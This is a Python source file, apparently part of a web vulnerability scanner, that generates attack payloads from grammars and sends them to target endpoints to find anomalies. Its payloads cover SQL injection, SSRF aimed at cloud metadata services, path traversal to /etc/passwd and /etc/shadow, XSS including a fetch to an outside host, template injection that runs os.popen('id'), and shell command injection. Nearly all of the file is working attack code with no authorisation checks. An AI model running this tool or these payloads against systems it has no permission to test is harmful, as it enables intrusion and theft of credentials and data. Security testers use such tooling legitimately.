import random
import re
import threading
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set

from tools.log_utils import get_logger

logger = get_logger("fuzz_engine")


@dataclass
class FuzzSeed:
    value: str
    vuln_type: str
    weight: float = 1.0
    tags: List[str] = field(default_factory=list)
    grammar: Optional[str] = None

    def mutate(self, intensity: float = 0.3) -> List[str]:
        results = [self.value]
        if intensity > 0.2:
            results.append(self.value.upper())
            results.append(self.value.lower())
            results.append(self.value * 2)
        if intensity > 0.5:
            results.append(self.value + " " * random.randint(1, 10))
            results.append("\t" + self.value)
            results.append(self.value + "\n")
        if intensity > 0.7:
            results.append(self.value.replace("=", "!= "))
            results.append(self.value.replace("1", "999999"))
            results.append(self.value + " OR 1=1")
            results.append("1' " + self.value)
        return results


GRAMMARS = {
    "sql": {
        "number": ["1", "0", "-1", "999"],
        "string": ["'", "\"", "')", "\"))"],
        "operator": ["=", "!=", ">", "<", "LIKE", "IN"],
        "keyword": ["UNION", "SELECT", "FROM", "WHERE", "SLEEP", "BENCHMARK"],
        "comment": ["--", "#", "/*", "*/"],
        "template": [
            "{num} {op} {num}",
            "{string} OR 1=1 {comment}",
            "{num} UNION SELECT {num},{num} {comment}",
            "{string} AND SLEEP({num}) {comment}",
        ],
    },
    "ssrf": {
        "protocol": ["http://", "https://", "file:///", "dict://", "gopher://", "ftp://"],
        "target": [
            "169.254.169.254", "127.0.0.1", "localhost",
            "metadata.google.internal", "100.100.100.200",
        ],
        "path": ["/latest/meta-data/", "/", "/admin", "/env", "/health"],
        "template": [
            "{protocol}{target}{path}",
            "{protocol}{target}:{num}",
            "{protocol}{target}/?url={protocol}{target}",
        ],
    },
    "lfi": {
        "prefix": ["", "...", "....", "..%252f", "..%c0%ae%c0%ae"],
        "path": [
            "/etc/passwd", "/etc/shadow", "/windows/win.ini",
            "/proc/self/environ", "/proc/self/fd/0",
        ],
        "wrapper": [
            "php://filter/convert.base64-encode/resource=",
            "php://input", "data://text/plain,",
            "expect://", "zip://",
        ],
        "template": [
            "{prefix}/{path}",
            "{wrapper}{path}",
            "{prefix}/{prefix}/{prefix}/{path}",
        ],
    },
    "xss": {
        "tag": ["<script>", "<img", "<svg", "<body", "<input"],
        "event": ["onload=", "onerror=", "onfocus=", "onclick="],
        "payload": ["alert(1)", "prompt(1)", "fetch('http://x.h')"],
        "closer": ["</script>", ">", "//>"],
        "template": [
            "<script>{payload}</script>",
            "<img src=x {event}{payload}>",
            "<svg/onload={payload}>",
            "\" onmouseover={payload} \"",
            "';{payload}//",
        ],
    },
    "ssti": {
        "delimiter": ["{{", "}}", "${", "}", "#{", "}", "{%", "%}"],
        "payload": ["7*7", "config", "self", "request", "app"],
        "call": [
            "__class__", "__mro__", "__subclasses__()",
            "__builtins__", "__import__('os').popen('id').read()",
        ],
        "template": [
            "{{7*7}}", "{{config}}", "{{self.__class__.__mro__}}",
            "${7*7}", "#{7*7}", "{%print(7*7)%}",
        ],
    },
    "cmdi": {
        "cmd": ["id", "whoami", "uname -a", "cat /etc/passwd", "dir", "ipconfig"],
        "separator": [";", "|", "||", "&", "&&", "\n", "`", "$()"],
        "prefix": ["", "1", "echo test"],
        "template": [
            "{prefix}{sep}{cmd}",
            "{prefix}|{cmd}",
            "{prefix}`{cmd}`",
            "$({cmd})",
        ],
    },
}


class FuzzEngine:
    def __init__(self, sess, timeout: float = 10.0):
        self.sess = sess
        self.timeout = timeout
        self.seed_pool: Dict[str, List[FuzzSeed]] = {}
        self.coverage: Dict[str, Set[int]] = defaultdict(set)
        self.interesting_inputs: List[Dict] = []
        self._lock = threading.Lock()
        self._init_seeds()

    def _init_seeds(self):
        for vuln_type, grammar in GRAMMARS.items():
            seeds = []
            for tpl in grammar.get("template", []):
                parts = re.findall(r"\{(\w+)\}", tpl)
                try:
                    filled = tpl
                    for p in parts:
                        candidates = grammar.get(p, ["1"])
                        filled = filled.replace("{%s}" % p, random.choice(candidates), 1)
                    seeds.append(FuzzSeed(filled, vuln_type, grammar="%s_template" % vuln_type))
                except Exception:
                    pass
            for key, values in grammar.items():
                if key != "template":
                    for v in values[:3]:
                        seeds.append(FuzzSeed(v, vuln_type, weight=0.7, tags=[key]))
            self.seed_pool[vuln_type] = seeds

    def generate(self, vuln_type: str, count: int = 10,
                 intensity: float = 0.5) -> List[str]:
        seeds = self.seed_pool.get(vuln_type, [])
        if not seeds:
            seeds = [s for pool in self.seed_pool.values() for s in pool]
        results = []
        for _ in range(count):
            if seeds:
                seed = random.choice(seeds)
                results.extend(seed.mutate(intensity))
        random.shuffle(results)
        return results[:count]

    def generate_hybrid(self, param_name: str, url_path: str = "",
                         response_hints: List[str] = None) -> List[str]:
        payloads = []
        param_lower = param_name.lower()

        param_type_map = {
            "id": ["sql", "lfi"],
            "file": ["lfi", "path_traversal"],
            "url": ["ssrf", "open_redirect"],
            "path": ["lfi", "path_traversal"],
            "q": ["sql", "xss", "ssti"],
            "search": ["sql", "xss", "ssti"],
            "name": ["xss", "ssti"],
            "email": ["xss", "ssti"],
            "msg": ["xss", "ssti", "cmdi"],
            "data": ["cmdi", "ssti", "deser"],
            "cmd": ["cmdi"],
            "key": ["lfi", "sql"],
            "redirect": ["open_redirect", "ssrf"],
            "next": ["open_redirect", "ssrf"],
            "host": ["ssrf", "host_header"],
            "json": ["deser", "proto_pollution"],
        }

        target_types = param_type_map.get(param_lower, ["sql", "xss", "lfi"])
        if "api" in url_path.lower() or "v1" in url_path.lower() or "v2" in url_path.lower():
            target_types.extend(["ssrf", "ssti", "cmdi"])
        if "upload" in url_path.lower() or "import" in url_path.lower():
            target_types.extend(["lfi", "cmdi"])
        if "login" in url_path.lower() or "auth" in url_path.lower():
            target_types.extend(["sql", "ssti"])

        response_hints = response_hints or []
        for hint in response_hints:
            hl = hint.lower()
            if "sql" in hl or "mysql" in hl or "postgres" in hl:
                target_types.append("sql")
            if "php" in hl:
                target_types.extend(["lfi", "cmdi"])
            if "spring" in hl or "java" in hl:
                target_types.extend(["ssti", "deser", "el"])

        for vt in set(target_types):
            payloads.extend(self.generate(vt, count=5))
        return payloads[:30]

    def test_payloads(self, url: str, param: str, payloads: List[str],
                       baseline_status: int = 200) -> List[Dict]:
        results = []
        baseline = None
        try:
            r = self.sess.get(url, params={param: "1"}, timeout=self.timeout)
            baseline = {"status": r.status_code, "size": len(r.text), "time": r.elapsed.total_seconds()}
        except Exception:
            baseline = {"status": 0, "size": 0, "time": 0}

        for payload in payloads:
            try:
                r = self.sess.get(url, params={param: payload}, timeout=self.timeout)
                resp = {
                    "payload": payload[:80],
                    "status": r.status_code,
                    "size": len(r.text),
                    "time": r.elapsed.total_seconds(),
                    "diff_status": r.status_code != baseline["status"],
                    "size_ratio": len(r.text) / max(baseline["size"], 1),
                    "time_ratio": r.elapsed.total_seconds() / max(baseline["time"], 0.01),
                }
                is_interesting = False
                if resp["diff_status"] and r.status_code in (500, 302, 200):
                    is_interesting = True
                if resp["size_ratio"] > 3.0 or resp["size_ratio"] < 0.3:
                    is_interesting = True
                if resp["time_ratio"] > 5.0 and r.elapsed.total_seconds() > 3:
                    is_interesting = True
                resp["interesting"] = is_interesting
                if is_interesting:
                    resp["body_preview"] = r.text[:200]
                    with self._lock:
                        self.interesting_inputs.append(resp)
                results.append(resp)
            except Exception:
                pass
        return results

    def fuzz_endpoint(self, url: str, param: str, response_hints: List[str] = None) -> Dict:
        import re
        path = re.sub(r'https?://[^/]+', '', url)
        payloads = self.generate_hybrid(param, path, response_hints)
        test_results = self.test_payloads(url, param, payloads)
        interesting = [r for r in test_results if r.get("interesting")]
        return {
            "url": url,
            "param": param,
            "payloads_tested": len(test_results),
            "interesting": len(interesting),
            "interesting_results": interesting[:10],
            "all_results": test_results,
        }

    def fuzz_batch(self, endpoints: List[Dict]) -> Dict:
        results = {}
        for ep in endpoints:
            url = ep.get("url", "")
            param = ep.get("param", "")
            if url and param:
                results["%s|%s" % (url, param)] = self.fuzz_endpoint(url, param)
        return {
            "endpoints_fuzzed": len(results),
            "total_payloads": sum(r["payloads_tested"] for r in results.values()),
            "total_interesting": sum(r["interesting"] for r in results.values()),
            "results": results,
        }


def run_fuzz(sess, base_url: str, timeout: float = 10.0,
             endpoints: Optional[List[Dict]] = None) -> Dict:
    engine = FuzzEngine(sess, timeout)
    if endpoints:
        return engine.fuzz_batch(endpoints)
    return engine.fuzz_endpoint(base_url, "id")
